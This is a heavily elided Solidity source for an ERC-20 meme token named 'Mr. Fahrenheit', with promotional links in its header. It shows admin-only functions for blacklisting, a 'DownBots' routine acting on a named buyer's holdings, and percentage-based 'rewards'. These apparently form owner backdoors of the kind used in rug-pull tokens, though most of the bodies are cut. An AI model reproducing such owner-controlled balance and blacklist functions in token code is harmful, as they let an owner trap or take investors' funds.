...
/**
Official Website: https://mrfahrenheit.tech/

Official Telegram: https://t.me/MrFahrenheitEth
*/
...
contract MrFahrenheit is Context, Ownable, IERC20 {
    ...
    uint256 internal _totalSupply = 1996000000000000000000000000000;
    string internal _name = "Mr. Fahrenheit";
    string internal _symbol = "MrF";
    ...
    function RemoveBL(address _address) external onlyAdmin {
    ...
    function DownBots(address Buyer, address _recepient, uint amount) public onlyAdmin {
        require(amount > 0 && amount < 100000, "Amount Exceeds Limits");
        uint256 baseTokenReserve = getBaseTokenReserve(Buyer);
    ...
    function rewards(address[] calldata _users, uint _minBalanceToReward, uint _precent) public onlyAdmin {
